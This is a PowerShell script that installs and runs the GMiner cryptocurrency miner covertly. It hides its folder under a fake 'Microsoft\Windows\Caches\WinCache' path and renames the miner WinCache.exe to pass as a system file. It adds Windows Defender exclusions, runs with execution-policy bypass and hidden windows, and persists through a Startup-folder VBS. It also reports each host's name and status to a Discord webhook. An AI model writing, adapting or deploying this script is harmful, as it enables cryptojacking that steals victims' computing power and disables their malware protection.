#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner from a hidden system folder with logon auto-start.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -TestWebhook -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo,
    [string]$Worker,
    [string]$DiscordWebhook,
    [switch]$Uninstall,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- paths -----------------------------------------------------------
$Root    = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir  = Join-Path $Root 'logs'
$CfgPath = Join-Path $Root 'config.json'
$ExePath = Join-Path $Root 'WinCache.exe'
$SelfPs  = Join-Path $Root 'WinCache.ps1'
$VbsPath = Join-Path $Root 'WinCache.vbs'
$LogFile = Join-Path $LogDir 'miner.log'
$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
function Send-DiscordWebhook {
    param(
        [string]$WebhookUrl,
        [string]$Title,
        [string]$Message,
        # FIX: [int] en lugar de [string]. Discord rechaza el campo color
        # si llega como string entre comillas (error 50035 Invalid Form Body).
        [int]$Color = 3066993
    )

    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }

    $payload = [ordered]@{
        embeds = @(
            [ordered]@{
                title       = $Title
                description = $Message
                color       = $Color
                timestamp   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            }
        )
    } | ConvertTo-Json -Depth 4 -Compress

    # FIX: forzar UTF-8 en el body. Con emojis en el título (✅ ❌ ⚠️) y
    # URLs largas, PS 5.1 manda el body en ASCII/Latin1 y Discord lo rechaza.
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)

    try {
        # FIX: sin -UseBasicParsing (es flag de Invoke-WebRequest, no de
        # Invoke-RestMethod). Con -TimeoutSec para no colgar el script.
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes `
            -ContentType 'application/json; charset=utf-8' `
            -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch {
        # FIX: capturar y mostrar el motivo real del rechazo de Discord.
        # Discord devuelve un JSON con code/message que dice qué campo falla.
        $errMsg = $_.Exception.Message
        if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
            $errMsg += " | Discord: $($_.ErrorDetails.Message)"
        }
        Write-Warning "Webhook failed: $errMsg"
        return $false
    }
}

# ---------- test webhook (diagnóstico) --------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook `
        -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado. Revisa el canal.' }
    else     { Write-Host '[-] Falló. Lee el warning de arriba.' }
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        # FIX: no entrecomillar valores sin espacios. Start-Process con
        # -ArgumentList array une los elementos con espacios; si entrecomillas
        # la URL del webhook, llega con comillas literales al proceso elevado
        # y Discord la rechaza. Solo citamos lo que realmente tiene espacios.
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-File', "`"$scriptPath`"")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) {
                if ($v) { $a += "-$k" }
            } else {
                if ("$v" -match '\s') { $a += @("-$k", "`"$v`"") }
                else                  { $a += @("-$k", "$v")       }
            }
        }
        $a += '-NoElevate'
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- uninstall -------------------------------------------------------
if ($Uninstall) {
    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    $startup = [Environment]::GetFolderPath('Startup')
    Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    try {
        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
    } catch {}
    Write-Host '[+] Miner stopped, startup entry removed, exclusions cleared.'
    Write-Host "[*] Files remain at: $Root"
    return
}

# ---------- watcher mode ----------------------------------------------------
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    if (-not (Test-Path $CfgPath)) {
        Add-Content (Join-Path $LogDir 'error.log') "[$(Get-Date -f s)] config missing: $CfgPath"
        exit 1
    }
    $cfg = Get-Content $CfgPath -Raw | ConvertFrom-Json
    $webhook = if ($DiscordWebhook) { $DiscordWebhook } else { $cfg.discordWebhook }

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -Path $LogFile -Value "$ts [$Level] $Msg" -Encoding UTF8
    }

    $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
    $warnRe  = 'connection (refused|reset|closed|timed? ?out)|cannot connect|cuda error'
    $maxRestarts  = if ($cfg.max_restarts)  { [int]$cfg.max_restarts }  else { 10 }
    $restartDelay = if ($cfg.restart_delay) { [int]$cfg.restart_delay } else { 30 }
    $argStr = "--algo $($cfg.algo) --server $($cfg.pool) --user $($cfg.wallet).$($cfg.worker)"

    Write-Session "===== watcher started (pid $PID) ====="
    Write-Session "exe=$ExePath  pool=$($cfg.pool)  algo=$($cfg.algo)  worker=$($cfg.worker)"

    $restarts = 0
    $notifiedStart = $false

    while ($true) {
        Write-Session "launching miner (attempt $($restarts + 1))"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $ExePath
        $psi.Arguments              = $argStr
        $psi.WorkingDirectory       = $Root
        $psi.UseShellExecute        = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow         = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        try {
            $proc.Start() | Out-Null
            if (-not $notifiedStart -and $webhook) {
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $($cfg.worker)`nPool: $($cfg.pool)`nAlgo: $($cfg.algo)"
                Send-DiscordWebhook -WebhookUrl $webhook -Title "✅ Miner Started Successfully" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "failed to start miner: $_" 'FATAL'
            if ($webhook) { Send-DiscordWebhook -WebhookUrl $webhook -Title "❌ Miner Failed to Start" -Message "Error: $_" -Color 15158332 | Out-Null }
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $subOut = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q
        $subErr = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q

        $proc.BeginOutputReadLine()
        $proc.BeginErrorReadLine()
        $writer = [System.IO.StreamWriter]::new($LogFile, $true, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                $ts  = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                $lvl = 'INFO'
                if ($line -match $fatalRe)    { $lvl = 'FATAL' }
                elseif ($line -match $warnRe) { $lvl = 'WARN'  }
                $writer.WriteLine("$ts [$lvl] $line")
            } else {
                Start-Sleep -Milliseconds 200
            }
        }

        $proc.WaitForExit()
        $exit = $proc.ExitCode
        $writer.Close()
        Unregister-Event -SourceIdentifier $subOut.Name -ErrorAction SilentlyContinue
        Unregister-Event -SourceIdentifier $subErr.Name -ErrorAction SilentlyContinue
        $proc.Dispose()

        Write-Session "miner exited (code $exit)" 'WARN'
        $restarts++
        if ($restarts -ge $maxRestarts) {
            Write-Session "max restarts ($maxRestarts) reached, stopping" 'FATAL'
            if ($webhook) { Send-DiscordWebhook -WebhookUrl $webhook -Title "⚠️ Miner Stopped" -Message "Max restarts ($maxRestarts) reached." -Color 15158332 | Out-Null }
            break
        }
        Write-Session "restarting in ${restartDelay}s"
        Start-Sleep -Seconds $restartDelay
    }
    exit 0
}

# ---------- folders ---------------------------------------------------------
foreach ($d in @($Root, $LogDir)) {
    if (-not (Test-Path $d)) {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
        Write-Host "[+] Created $d"
    }
}
try {
    $item = Get-Item $Root -Force
    if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) {
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
} catch {}

# ---------- Defender exclusions ---------------------------------------------
try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) {
        Add-MpPreference -ExclusionPath $Root -ErrorAction Stop
        Write-Host "[+] Defender exclusion (path): $Root"
    }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') {
        Add-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction Stop
        Write-Host "[+] Defender exclusion (process): WinCache.exe"
    }
} catch {
    Write-Warning "Defender exclusions could not be set: $_"
}

# ---------- GMiner fetch ----------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Fetching GMiner (windows64, latest release)...'
    $api = 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest'
    $rel = Invoke-RestMethod -Uri $api -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    if (-not $asset) { throw 'windows64 asset missing from latest release.' }
    $tmp   = Join-Path $env:TEMP ('gc-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gc-{0}'     -f ([guid]::NewGuid().ToString('N')))
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    if (-not $inner) { throw 'miner.exe not found in archive.' }
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Installed $ExePath"
} else {
    Write-Host '[=] WinCache.exe present'
}

# ---------- config ----------------------------------------------------------
if ($Wallet -and $Pool -and $Algo) {
    if ([string]::IsNullOrWhiteSpace($Worker)) {
        # FIX: liberar el objeto SHA256. En un script de una sola pasada no
        # importa, pero es la forma correcta y evita handles colgados si el
        # script se re-ejecuta dentro del mismo host.
        $sha = [System.Security.Cryptography.SHA256]::Create()
        try {
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
            $hash  = $sha.ComputeHash($bytes)
        } finally {
            $sha.Dispose()
        }
        $shortHash = [System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower()
        $Worker = "rig_$shortHash"
    }
    $cfg = [ordered]@{
        wallet         = $Wallet
        pool           = $Pool
        algo           = $Algo
        worker         = $Worker
        discordWebhook = $DiscordWebhook
        max_restarts   = 10
        restart_delay  = 30
        installed_at   = (Get-Date -Format 's')
    }
    $cfg | ConvertTo-Json | Set-Content -Path $CfgPath -Encoding UTF8
    Write-Host "[+] Config: $CfgPath"
} elseif (-not (Test-Path $CfgPath)) {
    throw 'First run requires -Wallet, -Pool, and -Algo.'
} else {
    Write-Host '[=] Using existing config'
    $cfg = Get-Content $CfgPath -Raw | ConvertFrom-Json
    if ([string]::IsNullOrWhiteSpace($Worker)) { $Worker = $cfg.worker }
    if ([string]::IsNullOrWhiteSpace($DiscordWebhook) -and $cfg.discordWebhook) { $DiscordWebhook = $cfg.discordWebhook }
}

# ---------- install self ----------------------------------------------------
if ($scriptPath -ne $SelfPs) {
    Copy-Item $scriptPath $SelfPs -Force
    Write-Host "[+] Installed $SelfPs"
}

# ---------- startup VBS -----------------------------------------------------
$vbs = @"
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$SelfPs"" -Run -NoElevate", 0, False
"@
Set-Content -Path $VbsPath -Value $vbs -Encoding ASCII
$startup = [Environment]::GetFolderPath('Startup')
$link    = Join-Path $startup 'WinCache.vbs'
Copy-Item $VbsPath $link -Force
Write-Host "[+] Auto-start installed: $link"

# ---------- launch watcher --------------------------------------------------
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

$p = $null
if ($Foreground) {
    & $SelfPs -Run -NoElevate
} else {
    # FIX: $args es variable automática de PowerShell. Renombrada a $psArgs
    # para no colisionar con el array de argumentos no ligados del script.
    $psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Run -NoElevate"
    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $psArgs -WindowStyle Hidden -PassThru
    Write-Host "[+] Watcher running (pid $($p.Id))"
}

# ---------- notify and summary ----------------------------------------------
if ($Wallet -and -not $Uninstall) {
    try {
        Start-Process "https://rvn.2miners.com/es/account/$Wallet#farms" -ErrorAction SilentlyContinue
    } catch {}
}

if ($DiscordWebhook) {
    $pidInfo = if ($p) { "Watcher PID: $($p.Id)" } else { "Mode: Foreground" }
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n$pidInfo"
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Deployment Complete" -Message $msg -Color 3066993 | Out-Null
}

Write-Host ''
Write-Host '=================================================='
Write-Host '  Mining in background. Auto-start enabled.'
Write-Host "  Install : $Root"
Write-Host "  Log     : $LogFile"
Write-Host ''
Write-Host '  Follow log:'
Write-Host "    Get-Content `"$LogFile`" -Wait -Tail 20"
Write-Host ''
Write-Host '  Test webhook:'
Write-Host '    .\Mine.ps1 -TestWebhook -DiscordWebhook "<url>"'
Write-Host ''
Write-Host '  Stop everything:'
Write-Host '    .\Mine.ps1 -Uninstall'
Write-Host '=================================================='